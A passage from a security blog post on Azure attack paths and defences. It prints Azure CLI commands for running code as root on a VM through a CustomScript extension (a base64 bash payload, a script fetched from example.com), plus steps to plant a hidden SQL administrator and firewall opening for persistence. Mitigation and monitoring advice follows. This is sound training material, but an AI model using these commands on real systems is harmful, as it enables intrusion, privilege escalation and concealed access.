+<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-storage-privesc.html#microsoftstoragestorageaccountslistkeysaction"><em>More on HackTricks</em></a></p>
+<h2 id="3-vmExtensions-Remote-Code"><a href="#3-vmExtensions-Remote-Code" class="headerlink" title="3. vmExtensions Remote Code"></a><strong>3. vmExtensions Remote Code</strong></h2><p><strong>Minimal permission:</strong> <code>Microsoft.Compute/virtualMachines/extensions/write</code></p>
+<p><strong>Goal</strong>: push an extension that executes arbitrary commands on a target VM.</p>
+<p><strong>Attack breakdown</strong></p>
+<ol>
+<li>Identify the VM with <code>az vm show --name &lt;vm&gt; --resource-group &lt;rg&gt;</code> to grab its resource ID and confirm OS.</li>
+<li>Plant your payload by running:</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">`# reverse shell example (Linux)`</span><br><span class="line"></span><br><span class="line">`az vm extension <span class="built_in">set</span> \`</span><br><span class="line"></span><br><span class="line">- `-resource-group &lt;rg&gt; \`</span><br><span class="line">- `-vm-name &lt;vm&gt; \`</span><br><span class="line">- `-name CustomScript \`</span><br><span class="line">- `-publisher Microsoft.Azure.Extensions \`</span><br><span class="line">- `-version 2.1 \`</span><br><span class="line">- `-settings <span class="string">&#x27;&#123;&#125;&#x27;</span> \`</span><br><span class="line">- `-protected-settings <span class="string">&#x27;&#123;&quot;commandToExecute&quot;:&quot;echo &lt;b64&gt; | base64 -d | bash&quot;&#125;&#x27;</span>`</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>—or point the extension at an external script:</li>
+</ol>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">`az vm extension <span class="built_in">set</span> \`</span><br><span class="line"></span><br><span class="line">- `-resource-group &lt;rg&gt; \`</span><br><span class="line">- `-vm-name &lt;vm&gt; \`</span><br><span class="line">- `-name CustomScript \`</span><br><span class="line">- `-publisher Microsoft.Azure.Extensions \`</span><br><span class="line">- `-version 2.1 \`</span><br><span class="line">- `-settings <span class="string">&#x27;&#123;&quot;fileUris&quot;:[&quot;https://example.com/hack.sh&quot;]&#125;&#x27;</span> \`</span><br><span class="line">- `-protected-settings <span class="string">&#x27;&#123;&quot;commandToExecute&quot;:&quot;sh hack.sh&quot;&#125;&#x27;</span>`</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>CustomScript and many other extensions run as <strong>root on Linux or SYSTEM on Windows</strong>, so the code executes with full OS privileges and can install backdoors, harvest credentials, get a reverse shell or pivot deeper into the network.</li>
+</ol>
+<p>A single <code>virtualMachines/extensions/write</code> call is enough to flip a low-tier identity into root&#x2F;SYSTEM control of the VM, and whatever the VM itself can reach, including its managed identities, without ever touching its console or credentials.</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-privilege-escalation/az-virtual-machines-and-network-privesc.html#microsoftcomputevirtualmachinesextensionswrite"><em>More on HackTricks</em></a></p>
+<hr>
+<h1 id="🌀-Other-High-Frequency-Azure-Weaknesses-—-2025-snapshot"><a href="#🌀-Other-High-Frequency-Azure-Weaknesses-—-2025-snapshot" class="headerlink" title="🌀 Other High-Frequency Azure Weaknesses — 2025 snapshot"></a><strong>🌀 Other High-Frequency Azure Weaknesses — 2025 snapshot</strong></h1><h2 id="1-Leaked-secrets-connection-strings-SAS-tokens"><a href="#1-Leaked-secrets-connection-strings-SAS-tokens" class="headerlink" title="1. Leaked secrets, connection strings &amp; SAS tokens"></a><strong>1. Leaked secrets, connection strings &amp; SAS tokens</strong></h2><p><a target="_blank" rel="noopener" href="https://www.gitguardian.com/state-of-secrets-sprawl-report-2024">GitGuardian’s 2024 “Secrets Sprawl” study</a> shows thousands of Azure connection strings and account keys turning up on public GitHub every single week, part of the 12.7 million total secrets it flagged last year. The risk is not theoretical: in 2<a target="_blank" rel="noopener" href="https://msrc.microsoft.com/blog/2023/09/microsoft-mitigated-exposure-of-internal-information-in-a-storage-account-due-to-overly-permissive-sas-token/">023 Microsoft AI researchers accidentally posted a Shared-Access-Signature</a> that exposed 38 TB of internal data, source code and Teams messages. Because an SAS or storage-account key bypasses Entra ID altogether, anyone who finds it can read or overwrite data until the expiry (or, for account keys, forever).</p>
+<p><strong>Mitigation:</strong> scan repos and CI logs for Azure tokens, move secrets into Key Vault, prefer managed identities over keys, and set short-lived SAS tokens with automatic rotation.</p>
+<hr>
+<h2 id="2-Public-Blob-containers-over-permissive-network-paths"><a href="#2-Public-Blob-containers-over-permissive-network-paths" class="headerlink" title="2. Public Blob containers &amp; over-permissive network paths"></a><strong>2. Public Blob containers &amp; over-permissive network paths</strong></h2><p>Misconfigured storage keeps leaking data: a <a target="_blank" rel="noopener" href="https://www.techradar.com/pro/security/over-26-million-resumes-exposed-in-top-cv-maker-data-breach-heres-what-we-know">February 2025 breach</a> left 26 million resumes in an open Azure Blob container belonging to TalentHook. Earlier exposures such as the <a target="_blank" rel="noopener" href="https://www.skyhighsecurity.com/industry-perspectives/bluebleed-leak-proves-it-again-you-cannot-assume-cloud-service-providers-are-secure.html">BlueBleed incident in 2022</a> showed that one anonymous-read container can spill customer names, emails and contracts from thousands of organizations. Open NSG rules add to the blast radius by exposing RDP&#x2F;SSH or database ports directly to the internet.</p>
+<p><strong>Mitigation:</strong> lock Blob containers to private access, require Azure Storage firewalls or Private Endpoints, deny <code>0.0.0.0/0</code> NSG rules by policy, and run automated sweeps with Defender for Cloud or ScoutSuite to catch anything that slips through.</p>
+<hr>
+<h2 id="3-Over-broad-RBAC-roles-cross-tenant-app-consent"><a href="#3-Over-broad-RBAC-roles-cross-tenant-app-consent" class="headerlink" title="3. Over-broad RBAC roles &amp; cross-tenant app consent"></a><strong>3. Over-broad RBAC roles &amp; cross-tenant app consent</strong></h2><p>A single custom role update or hasty Marketplace deploy can hand out <code>Contributor</code> or even <code>Owner</code> at subscription scope. <a target="_blank" rel="noopener" href="https://posts.specterops.io/microsoft-breach-what-happened-what-should-azure-admins-do-da2b7e674ebc">SpecterOps’ 2025 analysis</a> of the “Midnight Blizzard” breach highlights how service principals effectively become Global Admins—and how foreign apps can retain those powers for years if no one reviews them.</p>
+<p><strong>Mitigation:</strong> use Azure AD Privileged Identity Management to make high-impact roles eligible and time-bound, lean on Azure Advisor’s “unused role assignment” recommendations, block tenant-wide consent for new apps, and run weekly Resource Graph or Graph API scans for assignments that drift outside least-privilege guidelines.</p>
+<hr>
+<h1 id="Stealthy-Persistence-Azure-SQL-Backdoor"><a href="#Stealthy-Persistence-Azure-SQL-Backdoor" class="headerlink" title="Stealthy Persistence: Azure SQL Backdoor"></a><strong>Stealthy Persistence: Azure SQL Backdoor</strong></h1><p>Azure SQL offers two parallel doors, SQL Authentication and Entra ID Authentication, and both can be wedged open for long-term access.</p>
+<h2 id="Attack-recipe"><a href="#Attack-recipe" class="headerlink" title="Attack recipe"></a><strong>Attack recipe</strong></h2><p>Start by turning on SQL Authentication if it was disabled, then create a low-profile login (<code>CREATE LOGIN</code>) and map it to a user in every interesting database. Even simpler: harvest an existing SQL password from code, dumps, or GitHub and reuse it.</p>
+<p>With control of an Entra ID account that has <em>Contributor</em> on the server, call:</p>
+<p><code>az sql server ad-admin create \</code></p>
+<ul>
+<li><code>-resource-group &lt;rg&gt; \</code></li>
+<li><code>-server &lt;srv&gt; \</code></li>
+<li><code>-display-name &quot;BackdoorAdmin&quot; \</code></li>
+<li><code>-object-id &lt;compromised-objectId&gt;</code></li>
+</ul>
+<p>That one API (<code>Microsoft.Sql/servers/administrators/write</code>) crowns the attacker as Azure AD administrator, so every future token they obtain, CLI, Visual Studio, even a stolen refresh token, grants sysadmin rights inside the database engine.</p>
+<p>If the workload runs on an IaaS VM with SQL Server, drop a startup script or new local admin user on the box to survive credential rotation at the SQL layer. Finally, carve a firewall hole:</p>
+<p><code>az sql server firewall-rule create \</code></p>
+<ul>
+<li><code>-resource-group &lt;rg&gt; \</code></li>
+<li><code>-server &lt;srv&gt; \</code></li>
+<li><code>-name &quot;KeepDoorOpen&quot; \</code></li>
+<li><code>-start-ip-address &lt;attacker-IP&gt; \</code></li>
+<li><code>-end-ip-address &lt;attacker-IP&gt;</code></li>
+</ul>
+<p>That rule (<code>Microsoft.Sql/servers/firewallRules/write</code>) guarantees inbound reachability even after network hardening elsewhere.</p>
+<h2 id="Why-it-slips-past-defenders"><a href="#Why-it-slips-past-defenders" class="headerlink" title="Why it slips past defenders"></a><strong>Why it slips past defenders</strong></h2><ul>
+<li>SQL logins live entirely inside the database engine; Azure RBAC audits can’t see them.</li>
+<li>Setting an Azure AD admin looks like routine maintenance and triggers no sign-in disruption.</li>
+<li>The firewall rule is often mistaken for a temporary diagnostics change and forgotten.</li>
+</ul>
+<p>One new SQL user, one <code>ad-admin create</code>, and a quiet firewall rule are enough to keep a hidden foothold in Azure SQL long after the initial compromise is “fixed.”</p>
+<hr>
+<h1 id="Defense-Monitoring-Strategies"><a href="#Defense-Monitoring-Strategies" class="headerlink" title="Defense &amp; Monitoring Strategies"></a><strong>Defense &amp; Monitoring Strategies</strong></h1><p><a target="_blank" rel="noopener" href="https://images.coursestack.com/b29c0d77-61fb-460a-bbf2-dea82bcb0c62/17546e01-4d43-4c02-90f4-54304deec126">safe</a></p>
+<p>Securing Azure is a continuous loop of hardening, validation, and monitoring across every subscription and management group.</p>
+<h2 id="1-Harden-every-subscription-in-isolation"><a href="#1-Harden-every-subscription-in-isolation" class="headerlink" title="1. Harden every subscription in isolation"></a><strong>1. Harden every subscription in isolation</strong></h2><ul>
+<li><strong>Least-privilege RBAC</strong>: Trim <em>Owner&#x2F;Contributor</em> grants with Azure Advisor “unused role” findings, use Managed Identities for workloads, and enforce MFA or passwordless for every human account via Conditional Access.</li>
+<li><strong>Policy guardrails</strong>: Deploy Azure Policy to block public blobs (<code>Microsoft.Storage/storageAccounts/allowBlobPublicAccess</code>), deny Internet-facing NSG rules, require customer-managed keys on disks and SQL, and enforce Trusted Launch on VMs.</li>
+<li><strong>Secure defaults</strong>: Route traffic through Private Endpoints, enable Defender for Cloud’s Just-in-Time VM access, and apply resource locks on mission-critical storage.</li>
+<li><strong>Avoid default identities</strong>: Disable built-in system identities that start with broad rights and create scoped identities instead.</li>
+</ul>
+<h2 id="2-Eliminate-misconfigurations-early"><a href="#2-Eliminate-misconfigurations-early" class="headerlink" title="2. Eliminate misconfigurations early"></a><strong>2. Eliminate misconfigurations early</strong></h2><ul>
+<li><strong>Template gates</strong>: Break Bicep&#x2F;Terraform deploys in CI if they violate policy or open unmanaged ports.</li>
+<li><strong>Landing-zone blueprints</strong>: Stamp baseline VNets with deny-all NSGs, flow logs, and organisational tags before any app team onboards.</li>
+<li><strong>Guest Configuration</strong>: Enforce Defender Antivirus, Sysmon, and CIS benchmarks inside every VM at boot.</li>
+</ul>
+<h2 id="3-Restrict-external-trust"><a href="#3-Restrict-external-trust" class="headerlink" title="3. Restrict external trust"></a><strong>3. Restrict external trust</strong></h2><ul>
+<li><strong>No wildcards</strong>: Turn off user consent for multi-tenant apps; route new enterprise apps through App Governance review.</li>
+<li><strong>Scoped federation</strong>: Use explicit Cross-Tenant Access settings so partners receive only the precise groups and roles they need—Teams access ≠ SharePoint access.</li>
+<li><strong>Rotate or retire secrets</strong>: Force 90-day expiry on client secrets, move to Managed Identities or workload identity federation, and kill lingering storage-account keys.</li>
+</ul>
+<h2 id="4-Test-the-posture-constantly"><a href="#4-Test-the-posture-constantly" class="headerlink" title="4. Test the posture constantly"></a><strong>4. Test the posture constantly</strong></h2><ul>
+<li><strong>Continuous scanning</strong>: Keep Defender for Cloud secure score above target, patch findings weekly, and track progress with Power BI dashboards.</li>
+<li><strong>Open-source sweep</strong>: Schedule automatic auditing tools weekend; block pull requests on critical failures.</li>
+</ul>
+<h2 id="5-Monitor-for-malicious-actions"><a href="#5-Monitor-for-malicious-actions" class="headerlink" title="5. Monitor for malicious actions"></a><strong>5. Monitor for malicious actions</strong></h2><ul>
+<li><strong>Centralised, immutable logs</strong>: Stream Activity Logs and diagnostics to a locked Log Analytics workspace with retention policies.</li>
+<li><strong>Sentinel alerts</strong>: Trigger on high-risk ops like <code>roleDefinitions/write</code>, storage key regeneration, Key Vault <code>SecretGet</code>, or SQL AD admin changes.</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/ouhboy">malw0re</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://malw0re.github.io/ouhboy/2026/01/18/Azure/">https://malw0re.github.io/ouhboy/2026/01/18/Azure/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/ouhboy/tags/CloudSecurity/">CloudSecurity</a><a class="post-meta__tags" href="/ouhboy/tags/Cloud/">Cloud</a><a class="post-meta__tags" href="/ouhboy/tags/Azure/">Azure</a></div><div class="post-share"><div class="social-share" data-image="/ouhboy/images/azure.jpeg" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/ouhboy/2026/01/11/Aws/" title="AWS Security"><img class="cover" src="/ouhboy/images/aws.png" onerror="onerror=null;src='/ouhboy/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">AWS Security</div></div><div class="info-2"><div class="info-item-1">AWS Security Before we do anything else, let’s start at the absolute beginning with Identity. AWS Identity BasicsAccount – Your Primary Security BoundaryAn AWS account is an isolated container for resources, billing, and identity roots. Nothing inside one account is reachable from another, unless you create an explicit bridge (VPC peering, cross‑account role, etc.). An account is where you will be able to run infrastructure like EC2s, Lambdas, Containers DBs, etc. It’s always needed to create...</div></div></div></a><a class="pagination-related" href="/ouhboy/2026/02/01/Facts/" title="Facts HTB"><img class="cover" src="/ouhboy/images/fact.webp" onerror="onerror=null;src='/ouhboy/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Facts HTB</div></div><div class="info-2"><div class="info-item-1">Facts HTB (Season 10) It’s the start of the season 10 and we kick it off with an easy linux machine  Recon┌──(ouhboy㉿malw0re)-[~/…/Labs/HTB/S10/FACTS]└─$ sudo nmap -p- --min-rate 5000 -T4 10.129.20.220 -oN ports.nmap[sudo] password for ouhboy: Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-01 00:02 EATNmap scan report for 10.129.20.220Host is up (0.22s latency).Not shown: 65532 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh80/tcp    open  http54321/tcp open  unknownNma...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/ouhboy/2026/01/11/Aws/" title="AWS Security"><img class="cover" src="/ouhboy/images/aws.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-11</div><div class="info-item-2">AWS Security</div></div><div class="info-2"><div class="info-item-1">AWS Security Before we do anything else, let’s start at the absolute beginning with Identity. AWS Identity BasicsAccount – Your Primary Security BoundaryAn AWS account is an isolated container for resources, billing, and identity roots. Nothing inside one account is reachable from another, unless you create an explicit bridge (VPC peering, cross‑account role, etc.). An account is where you will be able to run infrastructure like EC2s, Lambdas, Containers DBs, etc. It’s always needed to create...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/ouhboy/images/cyber.png" onerror="this.onerror=null;this.src='/ouhboy/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">malw0re</div><div class="author-info-description">Cybersecurity, CTFs</div><div class="site-data"><a href="/ouhboy/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/ouhboy/tags/"><div class="headline">Tags</div><div class="length-num">12</div></a><a href="/ouhboy/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/malw0re"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/MALW0RE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/karanja-brian/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://www.x.com/M4LW0R3" target="_blank" title="Instagram"><i class="fab fa-twitter" style="color: #cd486b;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my blog where I post my writeups from Boxes & CTFs along with exploit research!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#EntraID-Identity-Basics"><span class="toc-number">1.</span> <span class="toc-text">EntraID Identity Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%AA%AA-Tenant-%E2%80%93-Your-Identity-and-Trust-Boundary-in-Entra-ID"><span class="toc-number">1.1.</span> <span class="toc-text">🪪 Tenant – Your Identity and Trust Boundary in Entra ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A4-User-%E2%80%93-Your-Digital-Identity-in-Entra-ID"><span class="toc-number">1.2.</span> <span class="toc-text">👤 User – Your Digital Identity in Entra ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%A5-Group-%E2%80%93-The-Permission-Bundle-in-Entra-ID"><span class="toc-number">1.3.</span> <span class="toc-text">👥 Group – The Permission Bundle in Entra ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%BC-Service-Principal-%E2%80%93-The-Non-Human-Identity-in-Entra-ID"><span class="toc-number">1.4.</span> <span class="toc-text">💼 Service Principal – The Non-Human Identity in Entra ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%91%E2%80%8D%F0%9F%92%BC-Managed-Identity-%E2%80%93-Credential-Free-Access-for-Azure-Workloads"><span class="toc-number">1.5.</span> <span class="toc-text">🧑‍💼 Managed Identity – Credential-Free Access for Azure Workloads</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%91-Role-%E2%80%93-Scoped-Admin-Authority-in-Entra-ID"><span class="toc-number">1.6.</span> <span class="toc-text">📑 Role – Scoped Admin Authority in Entra ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%97%BA%EF%B8%8F-App-Registration-%E2%80%93-The-Blueprint-of-Your-Application-in-Entra-ID"><span class="toc-number">1.7.</span> <span class="toc-text">🗺️ App Registration – The Blueprint of Your Application in Entra ID</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Azure-Identity-Basics"><span class="toc-number">2.</span> <span class="toc-text">Azure Identity Basics</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B1-Management-Groups-%E2%80%93-Your-Strategic-Governance-Boundary"><span class="toc-number">2.1.</span> <span class="toc-text">🧱 Management Groups – Your Strategic Governance Boundary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%93%9A-Subscriptions-%E2%80%93-Your-Primary-Security-Boundary"><span class="toc-number">2.2.</span> <span class="toc-text">📚 Subscriptions – Your Primary Security Boundary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-Resource-Groups-%E2%80%93-Your-Logical-Resource-Boundary"><span class="toc-number">2.3.</span> <span class="toc-text">🧠 Resource Groups – Your Logical Resource Boundary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Over-Privilege-Azure%E2%80%99s-Silent-Breach-Vector"><span class="toc-number">2.4.</span> <span class="toc-text">Over-Privilege: Azure’s Silent Breach Vector</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Three-Practical-Privilege-Escalation-Paths-Azure-Edition"><span class="toc-number">3.</span> <span class="toc-text">Three Practical Privilege Escalation Paths - Azure Edition</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-roleDefinitions-Self-Promotion"><span class="toc-number">3.1.</span> <span class="toc-text">1. roleDefinitions Self-Promotion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-storageAccounts-Key-Grab"><span class="toc-number">3.2.</span> <span class="toc-text">2. storageAccounts Key Grab</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-vmExtensions-Remote-Code"><span class="toc-number">3.3.</span> <span class="toc-text">3. vmExtensions Remote Code</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%F0%9F%8C%80-Other-High-Frequency-Azure-Weaknesses-%E2%80%94-2025-snapshot"><span class="toc-number">4.</span> <span class="toc-text">🌀 Other High-Frequency Azure Weaknesses — 2025 snapshot</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Leaked-secrets-connection-strings-SAS-tokens"><span class="toc-number">4.1.</span> <span class="toc-text">1. Leaked secrets, connection strings &amp; SAS tokens</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Public-Blob-containers-over-permissive-network-paths"><span class="toc-number">4.2.</span> <span class="toc-text">2. Public Blob containers &amp; over-permissive network paths</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Over-broad-RBAC-roles-cross-tenant-app-consent"><span class="toc-number">4.3.</span> <span class="toc-text">3. Over-broad RBAC roles &amp; cross-tenant app consent</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Stealthy-Persistence-Azure-SQL-Backdoor"><span class="toc-number">5.</span> <span class="toc-text">Stealthy Persistence: Azure SQL Backdoor</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-recipe"><span class="toc-number">5.1.</span> <span class="toc-text">Attack recipe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Why-it-slips-past-defenders"><span class="toc-number">5.2.</span> <span class="toc-text">Why it slips past defenders</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Defense-Monitoring-Strategies"><span class="toc-number">6.</span> <span class="toc-text">Defense &amp; Monitoring Strategies</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Harden-every-subscription-in-isolation"><span class="toc-number">6.1.</span> <span class="toc-text">1. Harden every subscription in isolation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Eliminate-misconfigurations-early"><span class="toc-number">6.2.</span> <span class="toc-text">2. Eliminate misconfigurations early</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Restrict-external-trust"><span class="toc-number">6.3.</span> <span class="toc-text">3. Restrict external trust</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-Test-the-posture-constantly"><span class="toc-number">6.4.</span> <span class="toc-text">4. Test the posture constantly</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-Monitor-for-malicious-actions"><span class="toc-number">6.5.</span> <span class="toc-text">5. Monitor for malicious actions</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2026/02/01/Facts/" title="Facts HTB"><img src="/ouhboy/images/fact.webp" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Facts HTB"/></a><div class="content"><a class="title" href="/ouhboy/2026/02/01/Facts/" title="Facts HTB">Facts HTB</a><time datetime="2026-01-31T23:38:46.000Z" title="Created 2026-02-01 02:38:46">2026-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2026/01/18/Azure/" title="Azure Security"><img src="/ouhboy/images/azure.jpeg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Azure Security"/></a><div class="content"><a class="title" href="/ouhboy/2026/01/18/Azure/" title="Azure Security">Azure Security</a><time datetime="2026-01-18T09:44:04.000Z" title="Created 2026-01-18 12:44:04">2026-01-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2026/01/11/Aws/" title="AWS Security"><img src="/ouhboy/images/aws.png" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="AWS Security"/></a><div class="content"><a class="title" href="/ouhboy/2026/01/11/Aws/" title="AWS Security">AWS Security</a><time datetime="2026-01-11T09:44:04.000Z" title="Created 2026-01-11 12:44:04">2026-01-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2024/07/13/kerberos-101/" title="Kerberos"><img src="/ouhboy/images/kerb.webp" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="Kerberos"/></a><div class="content"><a class="title" href="/ouhboy/2024/07/13/kerberos-101/" title="Kerberos">Kerberos</a><time datetime="2024-07-12T21:00:00.000Z" title="Created 2024-07-13 00:00:00">2024-07-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/ouhboy/2024/01/04/acls/" title="ACL AD"><img src="/ouhboy/images/access.jpg" onerror="this.onerror=null;this.src='/ouhboy/img/404.jpg'" alt="ACL AD"/></a><div class="content"><a class="title" href="/ouhboy/2024/01/04/acls/" title="ACL AD">ACL AD</a><time datetime="2024-01-03T21:00:00.000Z" title="Created 2024-01-04 00:00:00">2024-01-04</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;Since 100 BC - 2026 By malw0re</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/ouhboy/js/utils.js?v=5.5.3"></script><script src="/ouhboy/js/main.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><div class="js-pjax"></div><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/click-show-text.min.js" data-mobile="false" data-text="getsystem,sudo rm -rf,root,administrator,havoc,sliver,cobalt strike,python,c#,daz,empire,( ͡° ͜ʖ ͡°)" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
